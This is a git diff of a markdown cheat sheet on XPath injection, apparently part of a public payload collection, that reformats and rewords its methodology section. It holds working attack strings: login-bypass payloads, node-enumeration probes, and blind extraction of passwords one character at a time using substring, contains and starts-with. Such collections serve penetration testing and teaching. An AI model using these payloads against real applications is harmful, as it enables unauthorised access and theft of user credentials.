@@ -7,7 +7,7 @@
 
 * [Tools](#tools)
 * [Methodology](#methodology)
-    * [Blind exploitation](#blind-exploitation)
+    * [Blind Exploitation](#blind-exploitation)
     * [Out Of Band Exploitation](#out-of-band-exploitation)
 * [Labs](#labs)
 * [References](#references)
@@ -23,7 +23,11 @@
 
 ## Methodology
 
-Similar to SQL : `"string(//user[name/text()='" +vuln_var1+ "' and password/text()=’" +vuln_var1+ "']/account/text())"`
+Similar to SQL injection, you want to terminate the query properly: 
+
+```ps1
+string(//user[name/text()='" +vuln_var1+ "' and password/text()='" +vuln_var1+ "']/account/text())
+```
 
 ```sql
 ' or '1'='1
@@ -39,9 +43,9 @@ x' or name()='username' or 'x'='y
 ' and count(/*)=1 and '1'='1
 ' and count(/@*)=1 and '1'='1
 ' and count(/comment())=1 and '1'='1
-search=')] | //user/*[contains(*,'
-search=Har') and contains(../password,'c
-search=Har') and starts-with(../password,'c
+')] | //user/*[contains(*,'
+') and contains(../password,'c
+') and starts-with(../password,'c
 ```
 
 ### Blind Exploitation
@@ -50,7 +54,8 @@ search=Har') and starts-with(../password,'c
     ```sql
     and string-length(account)=SIZE_INT
     ```
-2. Extract a character
+
+2. Access a character with `substring`, and verify its value the `codepoints-to-string` function
     ```sql
     substring(//user[userid=5]/username,2,1)=CHAR_HERE
     substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)
